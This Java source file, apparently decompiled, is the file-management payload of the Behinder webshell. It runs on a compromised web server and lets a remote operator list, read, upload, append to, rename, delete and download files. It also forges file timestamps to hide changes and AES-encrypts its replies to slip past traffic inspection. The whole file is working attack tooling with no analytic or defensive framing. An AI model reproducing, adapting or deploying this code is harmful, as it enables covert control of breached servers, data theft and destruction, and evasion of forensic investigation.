package net.rebeyond.behinder.payload.java;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class FileOperation {
   public static String mode;
   public static String path;
   public static String newPath;
   public static String content;
   public static String charset;
   public static String createTimeStamp;
   public static String modifyTimeStamp;
   public static String accessTimeStamp;
   private Object Request;
   private Object Response;
   private Object Session;
   private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));

   public boolean equals(Object obj) {
      Object result = new HashMap();
      boolean var15 = false;

      boolean var3;
      label164: {
         Method write;
         Object so;
         label165: {
            try {
               var15 = true;
               this.fillContext(obj);
               if (mode.equalsIgnoreCase("list")) {
                  ((Map)result).put("msg", this.list());
                  ((Map)result).put("status", "success");
                  var15 = false;
               } else if (mode.equalsIgnoreCase("show")) {
                  ((Map)result).put("msg", this.show());
                  ((Map)result).put("status", "success");
                  var15 = false;
               } else if (mode.equalsIgnoreCase("delete")) {
                  result = this.delete();
                  var15 = false;
               } else if (mode.equalsIgnoreCase("create")) {
                  ((Map)result).put("msg", this.create());
                  ((Map)result).put("status", "success");
                  var15 = false;
               } else if (mode.equalsIgnoreCase("append")) {
                  ((Map)result).put("msg", this.append());
                  ((Map)result).put("status", "success");
                  var15 = false;
               } else {
                  if (mode.equalsIgnoreCase("download")) {
                     this.download();
                     var3 = true;
                     var15 = false;
                     break label164;
                  }

                  if (mode.equalsIgnoreCase("rename")) {
                     result = this.renameFile();
                     var15 = false;
                  } else if (mode.equalsIgnoreCase("createFile")) {
                     ((Map)result).put("msg", this.createFile());
                     ((Map)result).put("status", "success");
                     var15 = false;
                  } else if (mode.equalsIgnoreCase("createDirectory")) {
                     ((Map)result).put("msg", this.createDirectory());
                     ((Map)result).put("status", "success");
                     var15 = false;
                  } else if (mode.equalsIgnoreCase("getTimeStamp")) {
                     ((Map)result).put("msg", this.getTimeStamp());
                     ((Map)result).put("status", "success");
                     var15 = false;
                  } else if (mode.equalsIgnoreCase("updateTimeStamp")) {
                     ((Map)result).put("msg", this.updateTimeStamp());
                     ((Map)result).put("status", "success");
                     var15 = false;
                  } else {
                     var15 = false;
                  }
               }
               break label165;
            } catch (Exception var20) {
               ((Map)result).put("msg", var20.getMessage());
               ((Map)result).put("status", "fail");
               var15 = false;
            } finally {
               if (var15) {
                  try {
                     so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                     write = so.getClass().getMethod("write", byte[].class);
                     write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
                     so.getClass().getMethod("flush").invoke(so);
                     so.getClass().getMethod("close").invoke(so);
                  } catch (Exception var16) {
                  }

               }
            }

            try {
               so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
               write = so.getClass().getMethod("write", byte[].class);
               write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
               so.getClass().getMethod("flush").invoke(so);
               so.getClass().getMethod("close").invoke(so);
            } catch (Exception var18) {
            }

            return true;
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var19) {
         }

         return true;
      }

      try {
         Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         Method write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var17) {
      }

      return var3;
   }

   private Map warpFileObj(File file) {
      Map obj = new HashMap();
      obj.put("type", file.isDirectory() ? "directory" : "file");
      obj.put("name", file.getName());
      obj.put("size", file.length() + "");
      obj.put("perm", this.getFilePerm(file));
      obj.put("lastModified", (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date(file.lastModified())));
      return obj;
   }

   private boolean isOldJava() {
      String version = System.getProperty("java.version");
      return version.compareTo("1.7") < 0;
   }

   private String getFilePerm(File file) {
      String permStr = "";
      if (this.isWindows()) {
         permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
      } else {
         String version = System.getProperty("java.version");
         if (version.compareTo("1.7") >= 0) {
            try {
               this.getClass();
               Class FilesCls = Class.forName("java.nio.file.Files");
               this.getClass();
               Class PosixFileAttributesCls = Class.forName("java.nio.file.attribute.PosixFileAttributes");
               this.getClass();
               Class PathsCls = Class.forName("java.nio.file.Paths");
               this.getClass();
               Class PosixFilePermissionsCls = Class.forName("java.nio.file.attribute.PosixFilePermissions");
               Object f = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), file.getAbsolutePath(), new String[0]);
               Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, f, PosixFileAttributesCls, new LinkOption[0]);
               Object result = PosixFilePermissionsCls.getMethod("toString", Set.class).invoke(PosixFilePermissionsCls, PosixFileAttributesCls.getMethod("permissions").invoke(attrs));
               permStr = result.toString();
            } catch (Exception var11) {
            }
         } else {
            permStr = (file.canRead() ? "R" : "-") + "/" + (file.canWrite() ? "W" : "-") + "/" + (file.canExecute() ? "E" : "-");
         }
      }

      return permStr;
   }

   private String list() throws Exception {
      String result = "";
      File f = new File(path);
      List objArr = new ArrayList();
      objArr.add(this.warpFileObj(new File(".")));
      objArr.add(this.warpFileObj(new File("..")));
      if (f.isDirectory() && f.listFiles() != null) {
         File[] var4 = f.listFiles();
         int var5 = var4.length;

         for(int var6 = 0; var6 < var5; ++var6) {
            File temp = var4[var6];
            objArr.add(this.warpFileObj(temp));
         }
      }

      result = this.buildJsonArray(objArr, true);
      return result;
   }

   private String show() throws Exception {
      if (charset == null) {
         charset = System.getProperty("file.encoding");
      }

      StringBuffer sb = new StringBuffer();
      File f = new File(path);
      if (f.exists() && f.isFile()) {
         InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
         BufferedReader br = new BufferedReader(isr);
         String str = null;

         while((str = br.readLine()) != null) {
            sb.append(str + "\n");
         }

         br.close();
         isr.close();
      }

      return sb.toString();
   }

   private String create() throws Exception {
      String result = "";
      FileOutputStream fso = new FileOutputStream(path);
      fso.write(this.base64decode(content));
      fso.flush();
      fso.close();
      result = path + "上传完成，远程文件大小:" + (new File(path)).length();
      return result;
   }

   private Map renameFile() throws Exception {
      Map result = new HashMap();
      File oldFile = new File(path);
      File newFile = new File(newPath);
      if (oldFile.exists() && oldFile.isFile() & oldFile.renameTo(newFile)) {
         result.put("status", "success");
         result.put("msg", "重命名完成:" + newPath);
      } else {
         result.put("status", "fail");
         result.put("msg", "重命名失败:" + newPath);
      }

      return result;
   }

   private String createFile() throws Exception {
      String result = "";
      FileOutputStream fso = new FileOutputStream(path);
      fso.close();
      result = path + "创建完成";
      return result;
   }

   private String createDirectory() throws Exception {
      String result = "";
      File dir = new File(path);
      dir.mkdirs();
      result = path + "创建完成";
      return result;
   }

   private void download() throws Exception {
      FileInputStream fis = new FileInputStream(path);
      byte[] buffer = new byte[1024000];
      int length = 0;
      Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
      Method write = so.getClass().getMethod("write", byte[].class);

      while((length = fis.read(buffer)) > 0) {
         write.invoke(so, Arrays.copyOfRange(buffer, 0, length));
      }

      so.getClass().getMethod("flush").invoke(so);
      so.getClass().getMethod("close").invoke(so);
      fis.close();
   }

   private String append() throws Exception {
      String result = "";
      FileOutputStream fso = new FileOutputStream(path, true);
      fso.write(this.base64decode(content));
      fso.flush();
      fso.close();
      result = path + "追加完成，远程文件大小:" + (new File(path)).length();
      return result;
   }

   private Map delete() throws Exception {
      Map result = new HashMap();
      File f = new File(path);
      if (f.exists()) {
         if (f.delete()) {
            result.put("status", "success");
            result.put("msg", path + " 删除成功.");
         } else {
            result.put("status", "fail");
            result.put("msg", "文件" + path + "存在，但是删除失败.");
         }
      } else {
         result.put("status", "fail");
         result.put("msg", "文件不存在.");
      }

      return result;
   }

   private String getTimeStamp() throws Exception {
      String result = "";
      DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
      File f = new File(path);
      Map timeStampObj = new HashMap();
      if (f.exists()) {
         this.getClass();
         Class FilesCls = Class.forName("java.nio.file.Files");
         this.getClass();
         Class BasicFileAttributesCls = Class.forName("java.nio.file.attribute.BasicFileAttributes");
         this.getClass();
         Class PathsCls = Class.forName("java.nio.file.Paths");
         Object file = PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]);
         Object attrs = FilesCls.getMethod("readAttributes", Path.class, Class.class, LinkOption[].class).invoke(FilesCls, file, BasicFileAttributesCls, new LinkOption[0]);
         Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
         Object createTime = FileTimeCls.getMethod("toMillis").invoke(BasicFileAttributesCls.getMethod("creationTime").invoke(attrs));
         Object lastAccessTime = FileTimeCls.getMethod("toMillis").invoke(BasicFileAttributesCls.getMethod("lastAccessTime").invoke(attrs));
         Object lastModifiedTime = FileTimeCls.getMethod("toMillis").invoke(BasicFileAttributesCls.getMethod("lastModifiedTime").invoke(attrs));
         String createTimeStamp = df.format(new Date((Long)createTime));
         String lastAccessTimeStamp = df.format(new Date((Long)lastAccessTime));
         String lastModifiedTimeStamp = df.format(new Date((Long)lastModifiedTime));
         timeStampObj.put("createTime", createTimeStamp);
         timeStampObj.put("lastAccessTime", lastAccessTimeStamp);
         timeStampObj.put("lastModifiedTime", lastModifiedTimeStamp);
         result = this.buildJson(timeStampObj, true);
         return result;
      } else {
         throw new Exception("文件不存在");
      }
   }

   private boolean isWindows() {
      return System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
   }

   private String updateTimeStamp() throws Exception {
      String result = "";
      DateFormat df = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
      File f = new File(path);
      if (f.exists()) {
         f.setLastModified(df.parse(modifyTimeStamp).getTime());
         if (!this.isOldJava()) {
            Class PathsCls = Class.forName("java.nio.file.Paths");
            Class BasicFileAttributeViewCls = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
            Class FileTimeCls = Class.forName("java.nio.file.attribute.FileTime");
            Method getFileAttributeView = Class.forName("java.nio.file.Files").getMethod("getFileAttributeView", Path.class, Class.class, LinkOption[].class);
            Object attributes = getFileAttributeView.invoke(Class.forName("java.nio.file.Files"), PathsCls.getMethod("get", String.class, String[].class).invoke(PathsCls.getClass(), path, new String[0]), BasicFileAttributeViewCls, new LinkOption[0]);
            Object createTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(createTimeStamp).getTime());
            Object accessTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(accessTimeStamp).getTime());
            Object modifyTime = FileTimeCls.getMethod("fromMillis", Long.TYPE).invoke(FileTimeCls, df.parse(modifyTimeStamp).getTime());
            BasicFileAttributeViewCls.getMethod("setTimes", FileTimeCls, FileTimeCls, FileTimeCls).invoke(attributes, modifyTime, accessTime, createTime);
         }

         result = "时间戳修改成功。";
         return result;
      } else {
         throw new Exception("文件不存在");
      }
   }

   private String buildJsonArray(List list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      return encrypted;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text));
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }
}
